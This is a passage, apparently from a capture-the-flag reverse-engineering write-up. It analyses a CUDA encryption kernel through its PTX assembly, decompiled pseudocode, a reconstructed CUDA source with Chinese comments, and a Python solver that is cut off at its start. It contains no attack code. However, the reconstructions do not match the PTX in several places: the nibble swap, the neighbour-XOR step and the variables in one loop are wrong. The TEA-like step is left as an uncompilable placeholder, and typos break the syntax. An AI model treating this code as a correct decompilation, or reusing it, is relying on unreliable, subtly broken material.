or.b16 %rs29, %rs27, %rs28;
cvt.u16.u32 %rs30, %r243;
xor.b16 %rs58, %rs29, %rs30;
add.s32 %r243, %r243, 1;
setp.lt.u32 %p3, %r243, 10485760;
@%p3 bra $L__BB0_4;

mov.u32 %r244, 0;

$L__BB0_6:
cvt.u64.u16 %rd30, %rs58;
and.b64 %rd31, %rd30, 255;
add.s64 %rd33, %rd24, %rd31;
ld.const.u8 %rs31, [%rd33];
shr.u16 %rs32, %rs31, 4;
shl.b16 %rs33, %rs31, 4;
or.b16 %rs34, %rs32, %rs33;
cvt.u16.u32 %rs35, %r244;
xor.b16 %rs58, %rs34, %rs35;
add.s32 %r244, %r244, 1;
setp.lt.u32 %p4, %r244, 10485760;
@%p4 bra $L__BB0_6;

mov.u32 %r245, 0;

$L__BB0_8:
cvt.u64.u16 %rd34, %rs58;
and.b64 %rd35, %rd34, 255;
add.s64 %rd37, %rd24, %rd35;
ld.const.u8 %rs36, [%rd37];
shr.u16 %rs37, %rs36, 4;
shl.b16 %rs38, %rs36, 4;
or.b16 %rs39, %rs37, %rs38;
cvt.u16.u32 %rs40, %r245;
xor.b16 %rs58, %rs39, %rs40;
add.s32 %r245, %r245, 1;
setp.lt.u32 %p5, %r245, 10485760;
@%p5 bra $L__BB0_8;

mov.u32 %r246, 0;

$L__BB0_10:
cvt.u64.u16 %rd38, %rs58;
and.b64 %rd39, %rd38, 255;
add.s64 %rd41, %rd24, %rd39;
ld.const.u8 %rs41, [%rd41];
shr.u16 %rs42, %rs41, 4;
shl.b16 %rs43, %rs41, 4;
or.b16 %rs44, %rs42, %rs43;
cvt.u16.u32 %rs45, %r246;
xor.b16 %rs58, %rs44, %rs45;
add.s32 %r246, %r246, 1;
setp.lt.u32 %p6, %r246, 10485760;
@%p6 bra $L__BB0_10;

st.global.u8 [%rd3], %rs58;

$L__BB0_12:
bar.sync 0;
setp.ne.s32 %p7, %r4, 0;
@%p7 bra $L__BB0_17;

mov.u64 %rd42, $str;
cvta.global.u64 %rd43, %rd42;
mov.u64 %rd44, 0;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd43;
.param .b64 param1;
st.param.b64 [param1+0], %rd44;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r60, [retval0+0];
}
        setp.eq.s32 %p8, %r1, 0;
@%p8 bra $L__BB0_16;

mov.u32 %r247, 0;
mov.u64 %rd45, $str$1;
cvta.global.u64 %rd46, %rd45;
mov.u64 %rd97, %rd1;

$L__BB0_15:
ld.global.u8 %r62, [%rd97];
st.local.u32 [%rd2], %r62;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd46;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r63, [retval0+0];
}
        add.s64 %rd97, %rd97, 1;
add.s32 %r247, %r247, 1;
setp.lt.u32 %p9, %r247, %r1;
@%p9 bra $L__BB0_15;

$L__BB0_16:
mov.u64 %rd48, $str$2;
cvta.global.u64 %rd49, %rd48;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd49;
.param .b64 param1;
st.param.b64 [param1+0], %rd44;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r64, [retval0+0];
}

$L__BB0_17:
bar.sync 0;
setp.eq.s32 %p10, %r1, 0;
setp.ne.s32 %p11, %r3, 0;
or.pred %p12, %p11, %p10;
@%p12 bra $L__BB0_20;

cvt.s64.s32 %rd51, %r2;
add.s64 %rd98, %rd1, %rd51;
mov.u32 %r248, 0;

$L__BB0_19:
add.s32 %r248, %r248, 1;
rem.u32 %r66, %r248, %r1;
add.s32 %r67, %r66, %r2;
cvt.s64.s32 %rd52, %r67;
add.s64 %rd53, %rd1, %rd52;
ld.global.u8 %rs46, [%rd98];
xor.b16 %rs47, %rs46, %rs12;
ld.global.u8 %rs48, [%rd53];
xor.b16 %rs49, %rs47, %rs48;
st.global.u8 [%rd98], %rs49;
add.s64 %rd98, %rd98, 1;
setp.lt.u32 %p13, %r248, %r1;
@%p13 bra $L__BB0_19;

$L__BB0_20:
bar.sync 0;
@%p7 bra $L__BB0_25;

mov.u64 %rd54, $str$3;
cvta.global.u64 %rd55, %rd54;
mov.u64 %rd56, 0;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd55;
.param .b64 param1;
st.param.b64 [param1+0], %rd56;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r68, [retval0+0];
}
        @%p10 bra $L__BB0_24;

mov.u32 %r249, 0;
mov.u64 %rd57, $str$1;
cvta.global.u64 %rd58, %rd57;
mov.u64 %rd99, %rd1;

$L__BB0_23:
ld.global.u8 %r70, [%rd99];
st.local.u32 [%rd2], %r70;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd58;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r71, [retval0+0];
}
        add.s64 %rd99, %rd99, 1;
add.s32 %r249, %r249, 1;
setp.lt.u32 %p16, %r249, %r1;
@%p16 bra $L__BB0_23;

$L__BB0_24:
mov.u64 %rd60, $str$2;
cvta.global.u64 %rd61, %rd60;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd61;
.param .b64 param1;
st.param.b64 [param1+0], %rd56;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r72, [retval0+0];
}

$L__BB0_25:
bar.sync 0;
and.b32 %r73, %r3, 1;
setp.eq.b32 %p18, %r73, 1;
add.s32 %r74, %r3, 1;
rem.u32 %r75, %r74, %r1;
add.s32 %r76, %r75, %r2;
cvt.s64.s32 %rd63, %r76;
add.s64 %rd11, %rd1, %rd63;
or.pred %p19, %p1, %p18;
@%p19 bra $L__BB0_27;

ld.global.u8 %rs50, [%rd3];
ld.global.u8 %rs51, [%rd11];
st.global.u8 [%rd3], %rs51;
st.global.u8 [%rd11], %rs50;

$L__BB0_27:
bar.sync 0;
@%p7 bra $L__BB0_32;

mov.u64 %rd64, $str$4;
cvta.global.u64 %rd65, %rd64;
mov.u64 %rd66, 0;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd65;
.param .b64 param1;
st.param.b64 [param1+0], %rd66;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r77, [retval0+0];
}
        @%p10 bra $L__BB0_31;

mov.u32 %r250, 0;
mov.u64 %rd67, $str$1;
cvta.global.u64 %rd68, %rd67;
mov.u64 %rd100, %rd1;

$L__BB0_30:
ld.global.u8 %r79, [%rd100];
st.local.u32 [%rd2], %r79;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd68;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r80, [retval0+0];
}
        add.s64 %rd100, %rd100, 1;
add.s32 %r250, %r250, 1;
setp.lt.u32 %p22, %r250, %r1;
@%p22 bra $L__BB0_30;

$L__BB0_31:
mov.u64 %rd70, $str$2;
cvta.global.u64 %rd71, %rd70;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd71;
.param .b64 param1;
st.param.b64 [param1+0], %rd66;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r81, [retval0+0];
}

$L__BB0_32:
bar.sync 0;
setp.lt.s32 %p24, %r3, 1;
or.pred %p25, %p24, %p1;
shr.u32 %r82, %r3, 31;
add.s32 %r83, %r3, %r82;
and.b32 %r84, %r83, -2;
sub.s32 %r85, %r3, %r84;
setp.ne.s32 %p26, %r85, 1;
or.pred %p27, %p25, %p26;
@%p27 bra $L__BB0_34;

ld.global.u8 %rs52, [%rd3];
ld.global.u8 %rs53, [%rd11];
st.global.u8 [%rd3], %rs53;
st.global.u8 [%rd11], %rs52;

$L__BB0_34:
bar.sync 0;
@%p7 bra $L__BB0_39;

mov.u64 %rd73, $str$5;
cvta.global.u64 %rd74, %rd73;
mov.u64 %rd75, 0;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd74;
.param .b64 param1;
st.param.b64 [param1+0], %rd75;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r86, [retval0+0];
}
        @%p10 bra $L__BB0_38;

mov.u32 %r251, 0;
mov.u64 %rd76, $str$1;
cvta.global.u64 %rd77, %rd76;
mov.u64 %rd101, %rd1;

$L__BB0_37:
ld.global.u8 %r88, [%rd101];
st.local.u32 [%rd2], %r88;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd77;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r89, [retval0+0];
}
        add.s64 %rd101, %rd101, 1;
add.s32 %r251, %r251, 1;
setp.lt.u32 %p30, %r251, %r1;
@%p30 bra $L__BB0_37;

$L__BB0_38:
mov.u64 %rd79, $str$2;
cvta.global.u64 %rd80, %rd79;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd80;
.param .b64 param1;
st.param.b64 [param1+0], %rd75;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r90, [retval0+0];
}

$L__BB0_39:
bar.sync 0;
and.b32 %r91, %r3, 7;
setp.ne.s32 %p32, %r91, 0;
or.pred %p33, %p1, %p32;
@%p33 bra $L__BB0_43;

ld.global.u32 %r259, [%rd3+4];
ld.global.u32 %r260, [%rd3];
mov.u32 %r258, 0;
mov.u32 %r257, -239350328;
mov.u32 %r256, 387276957;
mov.u32 %r255, 2027808484;
mov.u32 %r254, -626627285;
mov.u32 %r253, 1013904242;
mov.u32 %r252, -1640531527;

$L__BB0_41:
shl.b32 %r99, %r259, 4;
add.s32 %r100, %r99, -1556008596;
shr.u32 %r101, %r259, 5;
add.s32 %r102, %r101, -939442524;
xor.b32 %r103, %r102, %r100;
add.s32 %r104, %r252, %r259;
xor.b32 %r105, %r103, %r104;
add.s32 %r106, %r105, %r260;
shl.b32 %r107, %r106, 4;
add.s32 %r108, %r107, 1013904242;
add.s32 %r109, %r106, %r252;
xor.b32 %r110, %r108, %r109;
shr.u32 %r111, %r106, 5;
add.s32 %r112, %r111, 338241895;
xor.b32 %r113, %r110, %r112;
add.s32 %r114, %r113, %r259;
shl.b32 %r115, %r114, 4;
add.s32 %r116, %r115, -1556008596;
add.s32 %r117, %r253, %r114;
shr.u32 %r118, %r114, 5;
add.s32 %r119, %r118, -939442524;
xor.b32 %r120, %r119, %r116;
xor.b32 %r121, %r120, %r117;
add.s32 %r122, %r121, %r106;
shl.b32 %r123, %r122, 4;
add.s32 %r124, %r123, 1013904242;
add.s32 %r125, %r122, %r253;
xor.b32 %r126, %r124, %r125;
shr.u32 %r127, %r122, 5;
add.s32 %r128, %r127, 338241895;
xor.b32 %r129, %r126, %r128;
add.s32 %r130, %r129, %r114;
shl.b32 %r131, %r130, 4;
add.s32 %r132, %r131, -1556008596;
add.s32 %r133, %r254, %r130;
shr.u32 %r134, %r130, 5;
add.s32 %r135, %r134, -939442524;
xor.b32 %r136, %r135, %r132;
xor.b32 %r137, %r136, %r133;
add.s32 %r138, %r137, %r122;
shl.b32 %r139, %r138, 4;
add.s32 %r140, %r139, 1013904242;
add.s32 %r141, %r138, %r254;
xor.b32 %r142, %r140, %r141;
shr.u32 %r143, %r138, 5;
add.s32 %r144, %r143, 338241895;
xor.b32 %r145, %r142, %r144;
add.s32 %r146, %r145, %r130;
shl.b32 %r147, %r146, 4;
add.s32 %r148, %r147, -1556008596;
add.s32 %r149, %r255, %r146;
shr.u32 %r150, %r146, 5;
add.s32 %r151, %r150, -939442524;
xor.b32 %r152, %r151, %r148;
xor.b32 %r153, %r152, %r149;
add.s32 %r154, %r153, %r138;
shl.b32 %r155, %r154, 4;
add.s32 %r156, %r155, 1013904242;
add.s32 %r157, %r154, %r255;
xor.b32 %r158, %r156, %r157;
shr.u32 %r159, %r154, 5;
add.s32 %r160, %r159, 338241895;
xor.b32 %r161, %r158, %r160;
add.s32 %r162, %r161, %r146;
shl.b32 %r163, %r162, 4;
add.s32 %r164, %r163, -1556008596;
add.s32 %r165, %r256, %r162;
shr.u32 %r166, %r162, 5;
add.s32 %r167, %r166, -939442524;
xor.b32 %r168, %r167, %r164;
xor.b32 %r169, %r168, %r165;
add.s32 %r170, %r169, %r154;
shl.b32 %r171, %r170, 4;
add.s32 %r172, %r171, 1013904242;
add.s32 %r173, %r170, %r256;
xor.b32 %r174, %r172, %r173;
shr.u32 %r175, %r170, 5;
add.s32 %r176, %r175, 338241895;
xor.b32 %r177, %r174, %r176;
add.s32 %r178, %r177, %r162;
shl.b32 %r179, %r178, 4;
add.s32 %r180, %r179, -1556008596;
add.s32 %r181, %r257, -1013904242;
add.s32 %r182, %r181, %r178;
shr.u32 %r183, %r178, 5;
add.s32 %r184, %r183, -939442524;
xor.b32 %r185, %r184, %r180;
xor.b32 %r186, %r185, %r182;
add.s32 %r187, %r186, %r170;
shl.b32 %r188, %r187, 4;
add.s32 %r189, %r188, 1013904242;
add.s32 %r190, %r187, %r181;
xor.b32 %r191, %r189, %r190;
shr.u32 %r192, %r187, 5;
add.s32 %r193, %r192, 338241895;
xor.b32 %r194, %r191, %r193;
add.s32 %r195, %r194, %r178;
shl.b32 %r196, %r195, 4;
add.s32 %r197, %r196, -1556008596;
add.s32 %r198, %r257, 1640531527;
add.s32 %r199, %r198, %r195;
shr.u32 %r200, %r195, 5;
add.s32 %r201, %r200, -939442524;
xor.b32 %r202, %r201, %r197;
xor.b32 %r203, %r202, %r199;
add.s32 %r204, %r203, %r187;
shl.b32 %r205, %r204, 4;
add.s32 %r206, %r205, 1013904242;
add.s32 %r207, %r204, %r198;
xor.b32 %r208, %r206, %r207;
shr.u32 %r209, %r204, 5;
add.s32 %r210, %r209, 338241895;
xor.b32 %r211, %r208, %r210;
add.s32 %r212, %r211, %r195;
shl.b32 %r213, %r212, 4;
add.s32 %r214, %r213, -1556008596;
add.s32 %r215, %r257, %r212;
shr.u32 %r216, %r212, 5;
add.s32 %r217, %r216, -939442524;
xor.b32 %r218, %r217, %r214;
xor.b32 %r219, %r218, %r215;
add.s32 %r260, %r219, %r204;
shl.b32 %r220, %r260, 4;
add.s32 %r221, %r220, 1013904242;
add.s32 %r222, %r260, %r257;
xor.b32 %r223, %r221, %r222;
shr.u32 %r224, %r260, 5;
add.s32 %r225, %r224, 338241895;
xor.b32 %r226, %r223, %r225;
add.s32 %r259, %r226, %r212;
add.s32 %r257, %r257, -239350328;
add.s32 %r256, %r256, -239350328;
add.s32 %r255, %r255, -239350328;
add.s32 %r254, %r254, -239350328;
add.s32 %r253, %r253, -239350328;
add.s32 %r252, %r252, -239350328;
add.s32 %r258, %r258, 8;
setp.ne.s32 %p34, %r258, 10485760;
@%p34 bra $L__BB0_41;

st.global.u32 [%rd3], %r260;
st.global.u32 [%rd3+4], %r259;

$L__BB0_43:
bar.sync 0;
@%p7 bra $L__BB0_52;

mov.u64 %rd82, $str$6;
cvta.global.u64 %rd83, %rd82;
mov.u64 %rd84, 0;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd83;
.param .b64 param1;
st.param.b64 [param1+0], %rd84;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r227, [retval0+0];
}
        @%p10 bra $L__BB0_51;

add.s32 %r229, %r1, -1;
and.b32 %r264, %r1, 3;
setp.lt.u32 %p37, %r229, 3;
mov.u32 %r263, 0;
@%p37 bra $L__BB0_48;

sub.s32 %r262, %r1, %r264;
mov.u64 %rd87, $str$1;
cvta.global.u64 %rd88, %rd87;

$L__BB0_47:
cvt.s64.s32 %rd85, %r263;
add.s64 %rd86, %rd1, %rd85;
ld.global.u8 %r231, [%rd86];
st.local.u32 [%rd2], %r231;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd88;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r232, [retval0+0];
}
        ld.global.u8 %r233, [%rd86+1];
st.local.u32 [%rd2], %r233;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd88;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r234, [retval0+0];
}
        ld.global.u8 %r235, [%rd86+2];
st.local.u32 [%rd2], %r235;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd88;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r236, [retval0+0];
}
        ld.global.u8 %r237, [%rd86+3];
st.local.u32 [%rd2], %r237;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd88;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r238, [retval0+0];
}
        add.s32 %r263, %r263, 4;
add.s32 %r262, %r262, -4;
setp.ne.s32 %p38, %r262, 0;
@%p38 bra $L__BB0_47;

$L__BB0_48:
setp.eq.s32 %p39, %r264, 0;
@%p39 bra $L__BB0_51;

cvt.s64.s32 %rd90, %r263;
add.s64 %rd102, %rd1, %rd90;
mov.u64 %rd91, $str$1;
cvta.global.u64 %rd92, %rd91;

$L__BB0_50:
.pragma "nounroll";
ld.global.u8 %r239, [%rd102];
st.local.u32 [%rd2], %r239;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd92;
.param .b64 param1;
st.param.b64 [param1+0], %rd20;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r240, [retval0+0];
}
        add.s64 %rd102, %rd102, 1;
add.s32 %r264, %r264, -1;
setp.ne.s32 %p40, %r264, 0;
@%p40 bra $L__BB0_50;

$L__BB0_51:
mov.u64 %rd94, $str$2;
cvta.global.u64 %rd95, %rd94;
{
        .reg .b32 temp_param_reg;
.param .b64 param0;
st.param.b64 [param0+0], %rd95;
.param .b64 param1;
st.param.b64 [param1+0], %rd84;
.param .b32 retval0;
call.uni (retval0),
vprintf,
(
param0,
param1
);
ld.param.b32 %r241, [retval0+0];
}

$L__BB0_52:
bar.sync 0;
cvt.u16.u32 %rs54, %r4;
ld.global.u8 %rs55, [%rd3];
xor.b16 %rs56, %rs55, %rs54;
st.global.u8 [%rd3], %rs56;
ret;
```



```
uint8_t* rd3 = (uint8_t*)(rd1 + r4);
uint8_t rs13 = *rd3;
uint16_t rs14 = (uint16_t)r4;
uint16_t rs15 = rs14*73;
uint16_t rs16 = rs15+temp;
uint16_t rs17 = rs13 ^ rs16;
uint16_t rs18 = rs17 & 0xF0;
uint16_t rs19 = rs18 >> 4;
uint16_t rs20 = rs17 << 4;
uint16_t rs58 = rs19 | rs20;

for(int i=0;i<10485760;i++)
{
    uint8_t rs21 = T[rs58 & 0xFF]
    uint16_t rs22 = rs21 >> 4;
    uint16_t rs23 = rs21 << 4;
    uint16_t rs24 = rs22 | rs23;
    rs58 = rs24 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
    uint8_t rs26 = T[rs58 & 0xFF]
    uint16_t rs27 = rs26 >> 4;
    uint16_t rs28 = rs26 << 4;
    uint16_t rs29 = rs27 | rs28;
    rs58 = rs29 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
    uint8_t rs31 = T[rs58 & 0xFF]
    uint16_t rs32 = rs31 >> 4;
    uint16_t rs33 = rs31 << 4;
    uint16_t rs34 = rs32 | rs33;
    rs58 = rs34 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
    uint8_t rs36 = T[rs58 & 0xFF]
    uint16_t rs37 = rs36 >> 4;
    uint16_t rs38 = rs36 << 4;
    uint16_t rs39 = rs37 | rs38;
    rs58 = rs39 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
    uint8_t rs41 = T[rs58 & 0xFF]
    uint16_t rs42 = rs36 >> 4;
    uint16_t rs43 = rs36 << 4;
    uint16_t rs44 = rs37 | rs38;
    rs58 = rs44 ^ (uint16_t)i;
}

uint32_t r257 = -239350328;
uint32_t r256 = 387276957;
uint32_t r255 = 2027808484;
uint32_t r254 = -626627285;
uint32_t r253 = 1013904242;
uint32_t r252 = -1640531527

k = {-1556008596,-939442524,1013904242,338241895};
uint32_t k0=k[0],k1=k[1],k2=k[2],k3=k[3];

for(int i=0;i<10485760;i+=8)
{
    v0 += (v1<<4+k0)^(v1 + r252)^(v1>>5 + k1)
    v1 += (v0<<4+k2)^(v0 + r252)^(v0>>5 + k3)

    v0 += (v1<<4+k0)^(v1 + r253)^(v1>>5 + k1)
    v1 += (v0<<4+k2)^(v0 + r253)^(v0>>5 + k3)

    v0 += (v1<<4+k0)^(v1 + r254)^(v1>>5 + k1)
    v1 += (v0<<4+k2)^(v0 + r254)^(v0>>5 + k3)

    v0 += (v1<<4+k0)^(v1 + r255)^(v1>>5 + k1)
    v1 += (v0<<4+k2)^(v0 + r255)^(v0>>5 + k3)

    v0 += (v1<<4+ k0)^(v1 + r256)^(v1>>5 + k1)
    v1 += (v0<<4+ k2)^(v0 + r256)^(v0>>5 + k3)

    v0 += (v1<<4+ k0)^(v1 + (r257 - 1013904242))^(v1>>5 + k1)
    v1 += (v0<<4+ k2)^(v0 + (r257 - 1013904242))^(v0>>5 + k3)

    v0 += (v1<<4+ k0)^(v1+ (r257 + 1640531527))^(v1>>5 + k1)
    v1 += (v0<<4+ k2)^(v0+ (r257 + 1640531527))^(v0>>5 + k3)

    v0 += (v1<<4+ k0)^(v1+ r257)^(v1>>5+ k1)
    v1 += (v0<<4+ k2)^(v0+ r257)^(v0>>5+ k3)
    
    r257 -= 239350328;
    r256 -= 239350328;
    r255 -= 239350328;
    r254 -= 239350328;
    r253 -= 239350328;
    r252 -= 239350328;
    
}
```



```
#include <stdio.h>
#include <stdint.h>

#define BLOCK_SIZE 256  // 假设块大小为 256，具体值需根据上下文确定

// 外部函数声明
extern"C"int vprintf(const char *format, ...);

// 常量数组 T 和 RT（RT 在代码中未使用，可忽略）
constuint8_t T[256] = {
    99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118,
    202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192,
    183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21,
    4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117,
    9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132,
    83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207,
    208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168,
    81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210,
    205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115,
    96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219,
    224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121,
    231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8,
    186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138,
    112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158,
    225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223,
    140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22
};

// 全局字符串
constchar str[] = "gift1:n";
constchar str1[] = "%02x ";
constchar str2[] = "n";
constchar str3[] = "gift2:n";
constchar str4[] = "gift3:n";
constchar str5[] = "gift4:n";
constchar str6[] = "gift5:n";

__global__ void encrypt_kernel(uchar *data, uchar key) {
    uint32_t tid = threadIdx.x;  // 线程 ID
    uint32_t bid = blockIdx.x;   // 块 ID
    uint32_t idx = bid * blockDim.x + tid;  // 全局线程索引
    
    // 检查是否在块内执行
    if (tid < blockDim.x) {
        uchar val = data[idx];
        uint16_t temp = (uint16_t)idx * 73 + key;
        val ^= temp;
        val = (val & 0xF0) | (val << 4);
        
        // 多次应用 S-box 变换（共 5 个 10485760 次的循环）
        for (int i = 0; i < 10485760; i++) {
            uint8_t index = val & 0xFF;
            uint8_t s_val = T[index];
            s_val = (s_val >> 4) | (s_val << 4);
            val = s_val ^ (uint16_t)i;
        }
        for (int i = 0; i < 10485760; i++) {
            uint8_t index = val & 0xFF;
            uint8_t s_val = T[index];
            s_val = (s_val >> 4) | (s_val << 4);
            val = s_val ^ (uint16_t)i;
        }
        for (int i = 0; i < 10485760; i++) {
            uint8_t index = val & 0xFF;
            uint8_t s_val = T[index];
            s_val = (s_val >> 4) | (s_val << 4);
            val = s_val ^ (uint16_t)i;
        }
        for (int i = 0; i < 10485760; i++) {
            uint8_t index = val & 0xFF;
            uint8_t s_val = T[index];
            s_val = (s_val >> 4) | (s_val << 4);
            val = s_val ^ (uint16_t)i;
        }
        for (int i = 0; i < 10485760; i++) {
            uint8_t index = val & 0xFF;
            uint8_t s_val = T[index];
            s_val = (s_val >> 4) | (s_val << 4);
            val = s_val ^ (uint16_t)i;
        }
        
        data[idx] = val;
    }
    
    __syncthreads();
    
    // 打印 gift1 阶段的结果（仅由 idx == 0 的线程执行）
    if (idx == 0) {
        printf("gift1:n");
        for (int i = 0; i < blockDim.x; i++) {
            printf("%02x ", data[i]);
        }
        printf("n");
    }
    
    __syncthreads();
    
    // 线程 0 处理相邻数据的异或操作
    if (tid == 0) {
        for (int i = 1; i < blockDim.x; i++) {
            uchar temp = data[i - 1] ^ key;
            temp ^= data[i];
            data[i - 1] = temp;
        }
    }
    
    __syncthreads();
    
    // 打印 gift2 阶段的结果（仅由 idx == 0 的线程执行）
    if (idx == 0) {
        printf("gift2:n");
        for (int i = 0; i < blockDim.x; i++) {
            printf("%02x ", data[i]);
        }
        printf("n");
    }
    
    __syncthreads();
    
    // 奇数线程 ID 交换相邻数据
    if (tid % 2 == 1 && tid < blockDim.x - 1) {
        uchar temp = data[idx];
        data[idx] = data[idx + 1];
        data[idx + 1] = temp;
    }
    
    __syncthreads();
    
    // 打印 gift3 阶段的结果（仅由 idx == 0 的线程执行）
    if (idx == 0) {
        printf("gift3:n");
        for (int i = 0; i < blockDim.x; i++) {
            printf("%02x ", data[i]);
        }
        printf("n");
    }
    
    __syncthreads();
    
    // 奇数线程 ID 再次交换相邻数据（需确保线程 ID >= 1）
    if (tid >= 1 && tid % 2 == 1 && tid < blockDim.x - 1) {
        uchar temp = data[idx];
        data[idx] = data[idx + 1];
        data[idx + 1] = temp;
    }
    
    __syncthreads();
    
    // 打印 gift4 阶段的结果（仅由 idx == 0 的线程执行）
    if (idx == 0) {
        printf("gift4:n");
        for (int i = 0; i < blockDim.x; i++) {
            printf("%02x ", data[i]);
        }
        printf("n");
    }
    
    __syncthreads();
    
    // 每 8 个线程执行复杂的位操作（可能是某种加密算法的一部分）
    if (tid % 8 == 0 && tid < blockDim.x) {
        uint32_t val1 = *(uint32_t*)(&data[idx]);
        uint32_t val2 = *(uint32_t*)(&data[idx + 4]);
        uint32_t constants[6] = {
            -1640531527, 1013904242, -626627285, 2027808484, 387276957, -239350328
        };
        uint32_t temp_val1 = val1, temp_val2 = val2;
        
        for (int i = 0; i < 10485760; i += 8) {
            // 复杂的位操作和异或运算，涉及常量和移位
            // 由于过于复杂，此处仅示意，具体实现需根据 PTX 代码进一步分析
            temp_val1 = /* 复杂的位操作 */;
            temp_val2 = /* 复杂的位操作 */;
            // 更新常量
            for (int j = 0; j < 6; j++) {
                constants[j] -= 239350328;
            }
        }
        
        *(uint32_t*)(&data[idx]) = temp_val1;
        *(uint32_t*)(&data[idx + 4]) = temp_val2;
    }
    
    __syncthreads();
    
    // 打印 gift5 阶段的结果（仅由 idx == 0 的线程执行）
    if (idx == 0) {
        printf("gift5:n");
        for (int i = 0; i < blockDim.x; i++) {
            printf("%02x ", data[i]);
        }
        printf("n");
    }
    
    __syncthreads();
    
    // 最终操作：每个线程对其数据进行异或
    if (tid < blockDim.x) {
        data[idx] ^= (uchar)idx;
    }
}
```



```
import struct

RT = [
